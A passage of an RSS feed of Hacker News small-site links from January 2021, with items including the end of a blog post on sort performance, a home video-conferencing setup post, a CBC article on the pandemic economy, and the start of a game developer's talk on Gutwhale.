<p>A key difference is that the core of the loop is now branch free. Yes, there are still two conditional jumps, but they are both just checking for the termination condition (that one of the lists to merge is exhausted), so we expect this loop to be free of branch mispredictions other than the final iteration. Indeed, we measure with <code>perf stat</code> that the misprediction rate has dropped from to close to 12 mispredicts per element to around 0.75 per element. The loop has only two loads and one store, so the memory access redundancy between the merge code and the comparator has been eliminated<sup id="fnref:load-redundancy" role="doc-noteref"><a href="#fn:load-redundancy">8</a></sup>. Finally, the comparator does a three-way compare (returning distrinct results for <code>&lt;</code>, <code>&gt;</code> and <code>==</code>), but the merge code only needs a two-way compare (<code>&lt;=</code> or <code>&gt;</code>) - inlining the comparator manages to remove extra code associated with distinguishing the <code>&lt;</code> and <code>==</code> cases.</p>

<p>What’s the payoff? It’s pretty big:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig2.svg" alt="Effect of comparator inlining"></p>

<p>The speedup hovers right around 1.77x. Note that this is much larger than simply eliminating all the time spent in the separate comparator function in the original version (about 17% of the time implying a speedup of 1.2x if all the function time disapeared). This is a good example of how inlining isn’t just about removing function call overhead but enabling further <em>knock on</em> optimizations which can have a much larger effect than just removing the overhead associated with function calls.</p>

<h2 id="what-about-c">What about C++?</h2>

<p>Short of copying the existing glibc (note: LGPL licenced) sorting code to allow inlining, what else can we do to speed things up? I’m writing in C++, so how about the C++ sort functions available in the <code>&lt;algorithm&gt;</code> header? Unlike C’s <code>qsort</code> which is generic by virtue of taking a function pointer and information about the object size, the C++ sort functions use templates to achieve genericity and so are implemented directly in header files. Since the sort code and the comparator are being compiler together, we expect the comparator to be easily inlined, and perhaps other optimizations may occur.</p>

<p>Without further ado, let’s just throw <code>std::sort</code>, <code>std::stable_sort</code> and <code>std::partial_sort</code> into the mix:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig3.svg" alt="C vs C++ sort functions"></p>

<p>The C++ sort functions, other than perhaps <code>std::partial_sort</code><sup id="fnref:partial-sort" role="doc-noteref"><a href="#fn:partial-sort">9</a></sup>, put in a good showing. It is interesting that <code>std::stable_sort</code> which has <em>stricly more requirements</em> on its implementation than <code>std::sort</code> (i.e., any stable sort is also suitable for <code>std::sort</code>) ends up faster. I re-wrote this paragaph several times, since sometimes after a reboot <code>stable_sort</code> was slower and sometimes it was faster (as shown above). When it was “fast” it had less than 2% branch mispredictions, and when it was slow it was at 15%. So perhaps there was some type of aliasing issue in the branch predictor which depends on the physical addresses assigned, which can vary from run to run, I’m not sure. See <sup id="fnref:stablesort" role="doc-noteref"><a href="#fn:stablesort">10</a></sup> for an old note from when <code>std::stable_sort</code> was slower.</p>

<h2 id="can-we-do-better">Can we do better?</h2>

<p>So that’s as fast as it gets, right? We aren’t going to beat <code>std::sort</code> or <code>std::stable_sort</code> without a huge amount of effort, I think? After all, these are presumably highly optimized sorting routines written by the standard library implementors. Sure, we might expect to be able to beat <code>qsort()</code>, but that’s mostly because of built-in disadvantages that <code>qsort</code> has, lacking the ability to inline the comparator, etc.</p>

<h3 id="radix-sort-attempt-1">Radix Sort Attempt 1</h3>

<p>Well, one thing we can try is a non-comparison sort. We know we have integer keys, so why stick to comparing …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://travisdowns.github.io/blog/2019/05/22/sorting.html">https://travisdowns.github.io/blog/2019/05/22/sorting.html</a></em></p>]]>
            </description>
            <link>https://travisdowns.github.io/blog/2019/05/22/sorting.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783617</guid>
            <pubDate>Thu, 14 Jan 2021 22:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sourcehut blog condeming Trump and supporters]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25783454">thread link</a>) | @lumpa
<br/>
January 14, 2021 | https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E | <a href="https://web.archive.org/web/*/https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://lists.sr.ht/~sircmpwn/sr.ht-discuss/%3CfaFmBHWTBbMkA8x8iTLj4srJ4wlAXXKoOQKOAk5ZXI%40cp3-web-024.plabs.ch%3E</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783454</guid>
            <pubDate>Thu, 14 Jan 2021 22:12:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Finding the best streaming setup for a Virtual Christmas]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25782922">thread link</a>) | @vladoh
<br/>
January 14, 2021 | https://haltakov.net/blog/christmas-streaming-setup/?ref=hn | <a href="https://web.archive.org/web/*/https://haltakov.net/blog/christmas-streaming-setup/?ref=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>We cancelled our travel plans over the Christmas holidays, because of the pandemic. So, I set on a challenge to find the perfect video conferencing setup to make the most out of the virtual get-togethers with friends and family!</p>
<h2>Virtual Christmas?</h2>
<p>Ever since we moved to Germany more than 10 years ago, we always went back to Bulgaria for the Christmas holidays to visit our families. It is also an opportunity for our 2 years-old son Leo to spend some time with his grandparents and aunts 😀.</p>
<p>However, with COVID-19 raging everywhere in Europe, we decided it is not worth the risk travelling and gathering with many people indoors. I was not going to sit around and whine, though, so I set on a challenge to make the best of the situation! How could I create a video conference setup allowing us to meet with multiple people and let Leo play and interact with them? 🤔</p>
<h2>The Challenge</h2>
<p>Now, you may think this is not really a big challenge... Everybody has a smartphone, so why not simply do a video call? Well, this was not good enough for me! Or maybe I just wanted to play around with my gadgets and find an excuse buy some new ones... 🤷‍♂️</p>
<p>The goal is to have an interactive video conference setup in Leo's room, so we could spend time with friends and family. I want him to be able to talk to the people on the other side of the call, play with them and feed them some wooden pizza 😁. The setup has to meet the following criteria:</p>
<ul>
<li>👐 Hands free - I don't want to be holding the camera all the time.</li>
<li>📱 Flexible - the camera should be moveable to capture the action up close. Ideally, I would be able to switch to my phone if Leo runs to another room.</li>
<li>🎥 Wide field of view - the camera should be able to see as much as possible of the room, so I don't have to move it every time Leo runs to the other side.</li>
<li>🖥 Big screen - Leo should be able to see the people in the video conference and interact with them.</li>
<li>🎙 Good sound - people should be able to hear us even when we are talking from the other side of the room.</li>
<li>🌃 Good light sensitivity - I want to have a reasonably good quality with the interior lighting, when it is dark outside.</li>
<li>📺 Streaming - multiple people should be able to join and leave whenever they want, while we are streaming.</li>
</ul>
<h2>The basic setup</h2>
<p>I decided to use my 15.6" MacBook Pro as the main device for doing video calls using <a href="https://jitsi.org/">Jitsi Meet</a>. During the lockdown in April, we were using it for virtual coffee breaks with colleagues and the experience was great. It is free and easy to use on smartphones, tablets and laptops. I can also connect to the call in parallel with my phone, if I need to go to another room. I would then just open a conference on Jitsi and send the link in a WhatsApp group with friends and family and whoever has time would join.</p>
<p>The MacBook's integrated microphone is good enough so that people can hear us from basically everywhere in the room with decent quality. It also has a big enough screen for us to see the other people on the call. The situation with the camera wasn't as that simple, though...</p>
<div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-evaluation-setup.jpg" data-type="image" data-width="2000" data-height="1500">
    <img src="https://haltakov.net/images/streaming-evaluation-setup.jpg" alt="Testing different cameras for the streaming setup">
  </a></p><p>Testing different cameras for the streaming setup</p>
</div>
</div>

<h3>Attempt 1 - the MacBook's integrated camera</h3>
<p>My first (and admittedly quite naive) attempt was to just use the integrated webcam of the MacBook. The problem is that integrated laptop cameras suck! <a href="https://twitter.com/JoannaStern">Joanna Stern</a> from the Wall Street Journal has a <a href="https://www.wsj.com/video/series/joanna-stern-personal-technology/laptop-webcam-showdown-macbook-air-dell-xps-theyre-pretty-bad/415D393C-4320-442B-974D-1887E20C057F">great video on the topic</a>. The quality of the image is really poor and the opening angle isn't great either - about 66° horizontal field of view. You can read below about my <a href="#how-to-compute-fov">highly scientific method</a> for measuring the camera's opening angle 😁.</p>
<div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-cam-mac.jpg" data-type="image" data-width="1280" data-height="720">
    <img src="https://haltakov.net/images/streaming-cam-mac.jpg" alt="The very noisy MacBook Pro integrated camera image">
  </a></p><p>The very noisy MacBook Pro integrated camera image</p>
</div>
</div>

<h3>Attempt 2 - buy a dedicated webcam</h3>
<p>My next (also quite naive) reaction was to go to Amazon and buy a cheap and high-quality (🤦‍♂️) webcam. I didn't want to spend too much money for a webcam that I wouldn't be using much otherwise. My assumption was that by now the technology is so advanced, that high-quality sensors and lenses are very cheap. I was wrong...</p>
<p>I ended up browsing through endless lists of seemingly identical webcams for about 30€. I ended up buying <a href="https://www.amazon.de/gp/product/B08M99YWG9/">this one from NIYPS</a>. It had very good reviews and promised Full HD resolution, wide angle and "clear images ... even in poor backlight". Turned out that it delivers upscaled 720p video, had very narrow viewing angle (about 42°) and the video quality was poor 😖. While the image was more or less sharp, the colors were terrible in all conditions.</p>
<p>I also incidentally stumbled upon this article on Hacker News and lost my hope to find a good webcam at a reasonable price - <a href="https://vsevolod.net/good-webcams/">Why can't you buy a good webcam?</a> So, let's see what else I could find at home...</p>
<div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-cam-web.jpg" data-type="image" data-width="1280" data-height="720">
    <img src="https://haltakov.net/images/streaming-cam-web.jpg" alt="The really poor NIYPS webcam image">
  </a></p><p>The really poor NIYPS webcam image</p>
</div>
</div>

<h3>Attempt 3 - use my DSLR</h3>
<p>My Nikon D5500 with a Tamron 16-300mm lens was just lying around collecting dust - we haven't been travelling much this year for obvious reasons...</p>
<p>I thought, that it can't be that hard to connect it to my laptop and use it as a webcam? Sure enough, Nikon has a <a href="https://www.nikonusa.com/en/learn-and-explore/webcam-utility.page">Webcam Utility</a> that allows you to do exactly that over a USB connection! There are several super sharp, high-quality images on their website, so it <strong>has to</strong> be good! Right? Right???</p>
<p>Well, it turned out they are definitely not made in "webcam mode". Not only does the webcam video have a mere 640 × 480 resolution, but it also contains a huge black border, so in reality it is something like 400 × 266. Seriously 😵??? What about the promised "incredible sharpness, clarity, and flattering depth of field"?</p>
<p>I researched a bit online why this is the case. It seems that the camera can't process large videos in real-time, so they needed to limit the resolution. Before going back to Amazon and buying a cam link, I had another genius idea... 💡 (vote here <a href="#" data-vote="haltakov/haltakovnet/cam-link" data-toggle="tooltip" data-placement="top" title="Click if you want me to write more about this topic in the future.">
    <svg viewBox="0 0 22 27" style="height: 1em; width: 0.815em">
        <circle r="5" cx="11" cy="5"></circle><rect ry="1.5" x="3" y="9" height="18" width="16" style="stroke:#fff;stroke-width:1.5"></rect><ellipse rx="3" ry="4" cx="3" cy="18.5" style="stroke:#fff;stroke-width:2"></ellipse><ellipse rx="3" ry="4" cx="19" cy="18.5" style="stroke:#fff;stroke-width:2"></ellipse>
    </svg>
</a> if you want me to write more about cam link).</p>
<div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-cam-nikon.jpg" data-type="image" data-width="640" data-height="480">
    <img src="https://haltakov.net/images/streaming-cam-nikon.jpg" alt="Is this a joke? Nikon D5500 as a webcam">
  </a></p><p>Is this a joke? Nikon D5500 as a webcam</p>
</div>
</div>

<h3>Attempt 4 - use my Osmo Action camera</h3>
<p>Last year I upgraded from my old GoPro HERO3 to a <a href="https://www.dji.com/de/osmo-action">DJI Osmo Action</a> camera that I typically use while travelling (if you want to read about the DJI Osmo, vote here <a href="#" data-vote="haltakov/haltakovnet/dji-osmo" data-toggle="tooltip" data-placement="top" title="Click if you want me to write more about this topic in the future.">
    <svg viewBox="0 0 22 27" style="height: 1em; width: 0.815em">
        <circle r="5" cx="11" cy="5"></circle><rect ry="1.5" x="3" y="9" height="18" width="16" style="stroke:#fff;stroke-width:1.5"></rect><ellipse rx="3" ry="4" cx="3" cy="18.5" style="stroke:#fff;stroke-width:2"></ellipse><ellipse rx="3" ry="4" cx="19" cy="18.5" style="stroke:#fff;stroke-width:2"></ellipse>
    </svg>
</a>). It is high-quality, portable and has a wide opening angle! Getting it to run as a webcam is not trivial, though - I needed to buy a <a href="https://www.gopro2webcam.com/">special software tool</a> to connect it to the MacBook. The good thing is, that you can do this it over Wi-Fi and you don't need to deal with cable. The whole process is a bit tricky and the software is buggy, but once it works, it works very well!</p>
<p>While the camera can record 4K video, for some reason the firmware doesn't allow streaming at a resolution higher than 720p. The horizontal field of view seems also limited to about 100° (from 120°), but it's still much wider than any other available option. It made a huge difference, because you could now see almost the whole room and get a better feeling what's going on.</p>
<p>I used this setup several times already and it works really well. I put the Osmo on a tripod from my old GoPro and I can easily move it at different places in the room. The image quality is far from perfect, but the wide opening angle compensates for that. This has become my main camera for now!</p>
<div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-cam-osmo.jpg" data-type="image" data-width="1280" data-height="720">
    <img src="https://haltakov.net/images/streaming-cam-osmo.jpg" alt="The wide-angle view from the DJI Osmo Action">
  </a></p><p>The wide-angle view from the DJI Osmo Action</p>
</div>
</div>

<h2>Further Improvements</h2>
<p>This setup works great now, but I'm thinking about several ways to make it even better.</p>
<h3>Sound</h3>
<p>While the MacBook's integrated microphone seems to work good in most cases, it can be better especially from the other side of the room. I tried enabling the mic on the Osmo, but then it starts picking up the sound from the speakers, creating an unpleasant audio feedback.</p>
<p>I bought a cheap omnidirectional mic with a long cable, with the idea to position it in the middle of the room. Unfortunately, as soon as I plug it in, the integrated speakers of the MacBook are deactivated. It seems that this is a hardware switch, which cannot be configured in software... 🤷‍♂️ I currently don't have any other external speakers I can use, but I'm waiting for my HomePod Mini to arrive in January. With it I should be able to improve the sound quality significantly.</p>
<h3>Screen</h3>
<p>I usually put my MacBook on the makeshift desk where I have my workstation from work during the corona times. So, right next to the laptop I actually have two much bigger screens! However, if I want to use them, I will have to push the laptop back which will be a problem for the microphone. As soon as, I solve the sound problem above, I should also be able to switch to the bigger monitor.</p>
<h3>Camera</h3>
<p>I'm still not quite happy with the quality of the video form the Osmo... The back camera of my iPhone XS delivers a way better image, so I plan to buy a smartphone tripod and give it a try. The problem with using the iPhone is that it has a much smaller opening angle than the Osmo. I have to see if it is worth it... Or maybe I need an iPhone 12 Pro with the wide-angle lens... 🤔</p>
<div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-cam-iphone-front.jpg" data-type="image" data-width="1920" data-height="1080">
    <img src="https://haltakov.net/images/streaming-cam-iphone-front.jpg" alt="The front camera of the iPhone XS is a bit noisy">
  </a></p><p>The front camera of the iPhone XS is a bit noisy</p>
</div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-cam-iphone-back.jpg" data-type="image" data-width="1920" data-height="1080">
    <img src="https://haltakov.net/images/streaming-cam-iphone-back.jpg" alt="The back camera of the iPhone XS is great">
  </a></p><p>The back camera of the iPhone XS is great</p>
</div>
</div>

<h2>Conclusion</h2>
<p>In the end, I was able to create a decent streaming setup, by mostly reusing hardware that I already had lying around at home. While the experience is not the same as in person, it works surprisingly well! All my family in Bulgaria is now able to spend time with Leo and drink some imaginary coffee he is serving them 🤷‍♂️. Always try to do the best of what is under your control! 💪</p>

<h2>Bonus: How to quickly measure the opening angle of a camera?</h2>
<div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-fov-osmo.jpg" data-type="image" data-width="1280" data-height="720">
    <img src="https://haltakov.net/images/streaming-fov-osmo.jpg" alt="The image used to compute the opening angle of the Osmo Action as a webcam">
  </a></p><p>The image used to compute the opening angle of the Osmo Action as a webcam</p>
</div>
  <div>
  <p><a href="https://haltakov.net/images/streaming-compute-fov.png" data-type="image" data-width="2000" data-height="1125">
    <img src="https://haltakov.net/images/streaming-compute-fov.png" alt="How to (approximately) calculate the horizontal opening angle of a camera">
  </a></p><p>How to (approximately) calculate the horizontal opening angle of a camera</p>
</div>
</div>

<p>While comparing the different cameras, I wanted to know their horizontal field of views. However, it turned out that this information is often difficult to find online. I thought about printing out a checkerboard and <a href="https://docs.opencv.org/master/dc/dbb/tutorial_py_calibration.html">calibrating the cameras with OpenCV</a>, but it would have been an overkill 😅. So, in a highly sophisticated and scientific manner, I decided …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://haltakov.net/blog/christmas-streaming-setup/?ref=hn">https://haltakov.net/blog/christmas-streaming-setup/?ref=hn</a></em></p>]]>
            </description>
            <link>https://haltakov.net/blog/christmas-streaming-setup/?ref=hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782922</guid>
            <pubDate>Thu, 14 Jan 2021 21:33:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Global economy faces fears of a 'lost decade' as Covid-19 cases surge]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25782611">thread link</a>) | @mgh2
<br/>
January 14, 2021 | https://www.cbc.ca/news/business/global-economy-slower-recovery-covid-19-1.5861968 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/business/global-economy-slower-recovery-covid-19-1.5861968">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Attempts to keep the economy open while fighting the coronavirus face new challenges from mutating COVID-19 variants, as the World Bank expresses concerns about financial stress for countries that failed to get on top of the pandemic early.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5862478.1609885138!/cpImage/httpImage/image.jpg_gen/derivatives/16x9_780/ont-covid-retail-20201219.jpg"></p></div><figcaption>The doors of a Hudson's Bay department store in Toronto remained closed to in-store Christmas shoppers in December due to strict COVID-19 measures in Ontario's hot spots. Some observers are suggesting that the vaccine rollout may not bring an economic recovery before year's end.<!-- --> <!-- -->(Chris Young/The Canadian Press)</figcaption></figure><p><span><p>Optimism that the early arrival of a vaccine meant that the global economy would be out of the woods in 2021 is facing a rethink as COVID-19 resurges and mutates.</p>  <p>There remains every possibility that an efficient rollout of the vaccine in Canada and elsewhere really will lead to signs of a recovery well before the end of this year. But there are voices suggesting that the pandemic may hold more bad news in store.</p>  <p>Certainly the year's first day of market trading was less than auspicious.</p>  <p>"Stocks hit records early in the session as investors focused on the rollout of COVID-19 vaccines," Reuters reported. "But investors quickly turned cautious over the path of the virus, which continues to spread amid the discovery of a new variant."</p>  <p>It is never a good idea to put too much stock in a single day's trading or <u><a href="https://www.cbc.ca/news/business/simple-explanations-for-market-ups-and-downs-often-prove-unreliable-don-pittis-1.5610209" target="_blank">the instant analysis of sudden market moves</a></u>, but Monday's decline — which&nbsp;saw a fall in the technology-heavy Nasdaq market of nearly three&nbsp;per cent — added to a feeling of unease.</p>  <h2>Triggering tighter restrictions</h2>  <p>"As the new COVID-19 strain triggers tighter restrictions on economic activity and limits even more the movement of people, it has become increasingly clear that the road to vaccine-induced immunity will now have more potholes," Mohamed El-Erian, a well-known U.S. adviser to financial corporations who is now president of Queen's College, Cambridge, wrote in <u><a href="https://twitter.com/FinancialTimes/status/1346358293183258624" target="_blank">Tuesday's Financial Times</a></u>.</p>  <p>El-Erian worried that the struggle to recover from the pandemic's economic impact would lead to misguided efforts by countries toward a "further weaponization of trade tariffs" and a destabilizing polarization in politics and income.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-britain.jpg 300w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-britain.jpg 460w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-britain.jpg 620w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-britain.jpg 780w,https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-britain.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5862121.1609876409!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-britain.jpg"></p></div><figcaption>Ambulances line up in London on Tuesday, where a more virulent strain of COVID-19 has contributed to a renewed outbreak and new economic closures. Case and death rates in regions that remained largely open mean places such as Britain have faced growing pressure to take stronger action.<!-- --> <!-- -->(Hannah McKay/Reuters)</figcaption></figure></span></p>  <p>Virologists warn of not just a single new strain&nbsp;but a series of continuing mutations as the disease spreads around the world, constantly evolving through accidental changes in its genetic makeup. Then, as we have already seen, the most virulent versions out-compete their viral cousins to sweep back out and around the world.</p>  <p>With luck, the faster-spreading mutations will be no worse — and could theoretically be milder. But some scientists in the United Kingdom have warned that current vaccines may not be as effective on one new variant in South Africa.</p>    <p>The more virulent European version has already turned up in the United States and Canada. As of this writing, the one found in South Africa has not yet been spotted here, but experience with previous transmission waves implies its arrival is inevitable.</p>  <p>Meanwhile, the idea that countries and regions can fight the virus while keeping the economy intact is facing contradictory evidence.</p>  <p>Case and death rates in regions that remained largely open&nbsp;mean places such as&nbsp;Britain and the U.S.&nbsp;have faced increasing public pressure to take stronger action, even as the economy weakens. Places that imposed severe lockdowns earlier in the battle against the pandemic, such as Australia and China, have seen relative economic success.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-safrica.jpg 300w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-safrica.jpg 460w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-safrica.jpg 620w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-safrica.jpg 780w,https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-safrica.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5862120.1609887256!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-safrica.jpg"></p></div><figcaption>Police patrol the streets of Johannesburg on Jan. 1 during a curfew imposed after a new variant of the coronavirus was found. Some scientists in the U.K. have warned that current vaccines may not be as effective on the variant in South Africa.<!-- --> <!-- -->(Siphiwe Sibeko/Reuters)</figcaption></figure></span></p>  <h2>World Bank worries about debt, education breakdown</h2>  <p>China's economic data is commonly disputed, but the World Bank suggests growth in the country will rebound to about eight&nbsp;per cent this year.</p>  <p>In its newly released <a href="https://www.worldbank.org/en/publication/global-economic-prospects" target="_blank">Global Economic Prospects</a> report for 2021, the World Bank fears a lingering impact from the virus — what it warned could be a "lost decade," especially for countries that failed to get on top of the pandemic early.</p>    <p>"Many countries are expected to lose a decade or more of per-capita income gains," the World Bank report said. "Downside risks include the possibility of a further resurgence of the virus, more severe effects on potential output from the pandemic&nbsp;and financial stress."</p>  <p>Besides the immediate damage to the economy caused by interruptions to trade, domestic commercial activity and job losses, the World Bank worries that such factors as a huge piling up of public and private debt and a breakdown in education will lead to a prolonged deterioration in economic prospects.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/health-coronavirus-canada.jpg 300w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/health-coronavirus-canada.jpg 460w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/health-coronavirus-canada.jpg 620w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-canada.jpg 780w,https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/health-coronavirus-canada.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5862122.1609880954!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/health-coronavirus-canada.jpg"></p></div><figcaption>A nearly empty Pearson International Airport in Toronto on Dec. 30. In parts of Canada and in the U.K., calls for stricter measures — including more severe limits on travel intended to combat the spread of COVID-19 — make hopes for an economic rebound in 2021 seem less certain.<!-- --> <!-- -->(Carlos Osorio/Reuters)</figcaption></figure></span></p>  <p>In parts of Canada and in the U.K., calls for stricter measures — including more severe limits on travel intended to combat holiday-induced spread and growing pressure on hospitals — mean earlier hopes that the autumn rebound would continue&nbsp;into 2021 seem less certain.</p>  <p>Although they may be distorted by the holidays, jobs data for both the U.S. and Canada are due on Friday and will offer the freshest possible update on whether the slow but steady uptick in the Canadian economy has stalled.</p>    <p>Gross domestic product figures released two weeks ago showed that growth has continued to creep up ever since April's big dip. If that continues, it won't strictly be <u><a href="https://www.cbc.ca/news/business/economic-recovery-letters-analysis-1.5574372" target="_blank">a V-shaped recovery</a></u>, but maybe a V written by a four-year-old that stretches out a bit too far to the right.</p>  <p>That may have changed. The GDP data was from October when everyone was far more optimistic, whereas Statistics Canada collected the December jobs data that we'll see on Friday just weeks ago.</p>  <p>Those employment figures may offer a first hint if the right-hand bar of the V has jogged down, making it into something closer to a W — the potential indicator of a double-dip recession.</p>  <p><em><strong>WATCH | Making vital supplies became saviour for manufacturers during pandemic:</strong></em></p>  <p><span><span><div><div title="Making vital supplies during the pandemic became a saviour for Canadian manufacturing" role="button" tabindex="0"><div><div aria-labelledby="1839453763522-metadata-" title="Making vital supplies during the pandemic became a saviour for Canadian manufacturing"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/128/830/pandemic-manufacturing-shift-armstrong-010121.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>As the pandemic ramped up, Canada's manufacturing sector nimbly shifted gears and started making products to keep people safe from COVID-19. Even among manufacturers, it reminded people what happens when a country makes its own necessary goods.<!-- --> <!-- -->2:09</span></span></span></p>  <p>Follow Don Pittis&nbsp;on Twitter: @don_pittis</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/business/global-economy-slower-recovery-covid-19-1.5861968</link>
            <guid isPermaLink="false">hacker-news-small-sites-25782611</guid>
            <pubDate>Thu, 14 Jan 2021 21:11:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye Gutwhale (2020)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25782307">thread link</a>) | @BobbyVsTheDevil
<br/>
January 14, 2021 | http://stuffedwomb.at/goodbye_gutwhale | <a href="https://web.archive.org/web/*/http://stuffedwomb.at/goodbye_gutwhale">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><a href="http://stuffedwomb.at/thinking">back</a></p>

<div><p>Finally, almost 3 months after it released, I can stop thinking about Gutwhale.</p><p>
<em>This is the edited script of a talk I gave for the Game Dev Days 2020.</em></p></div>

<p><strong>Content</strong></p>
<ul>
  <li>the endles gamejam</li>
  <li>the call to action</li>
  <li>the important thing</li>
  <li>the power of deadlines</li>
  <li>the cost of deadlines</li>
  <li>the nice things</li>
  <li>conclusion</li>
</ul>



<h2>the endless gamejam</h2>

<div><p>A few years ago I only did gamejams.<br> 
Gamejams are essentially deadlines, forcing you finish something. <br>
I also did a lot of short jams alone, where i would sit down and give myself 30 minutes to make a prototype.<br>
Many of the gifs I post on twitter are the results of these solo jams.</p><p> 

This helped me to learn to code and to design and to schedule, but over time I found that simply making stuff was not enough anymore.</p><p>
What I really love is doing something new. <br>
Something that has not existed before.<br>
Finding a new angle on an old problem brings me an intense, deep joy that is really hard to describe.</p><p>

There is a lot of unexplored space in games and what I am currently really interested in is <strong>expression</strong>:<br>
How do I tell a story through a game? </p><p>
How do I communicate how I feel through videogames? </p><p>
Its really hard and kind of stupid, considering that videogames are all about endless repetition in closed systems, but its what i want to explore right now.</p><p>

And I explored it at my own pace while working as a receptionist, making games like <a href="https://www.google.com/">Up in the sky</a> and <a href="https://www.google.com/">Every Wall</a>.
</p></div>

<h2>the important thing</h2>
<div><p>There is a game developer called <a href="https://twitter.com/miziziziz">miziziziz</a>, one of the few who makes watchable youtube videos, 
who made a commercial game called <a href="https://store.steampowered.com/app/1232330/Theyest_Thou">Theyes Thou</a> in one month.</p><p>

When I lost my job as a receptionist because of the coronavirus, I decided to steal that idea.<br>
Since I am not overly interested in traditional FUN game design, I needed to make something that felt new to me. <br>
I needed to make a game that actually said something about the world we move through everyday. Just making an entertainment box would have been too boring and unfocused. </p><p>

But since I was unemployed I felt like I needed to make something that at least had a shot at commercial viability. One month is not a lot of time, but I needed to come up with something that people would also want to pay for.
<br>
The roguelike we ended up making contains a short section at the end where I try to actually say something, where I try to express myself. This part of the game was important to me, the rest was just decorations. <br>
I wanted people to buy the game because it looked like a nice little roguelike, and then, in the end, I wanted them to engage with this secret part of the game that was actually important to me. </p><p>

And I had one month to make that real.</p></div>

<h2>the power of deadlines</h2>
<p>Gutwhale is a product of its deadline.<br> 
All of it was made in the easiest way possible. The code is a mess of course, but I want to talk more about the decisions, forced upon us by the deadline, that permeate the whole project:<br></p>

<ul>
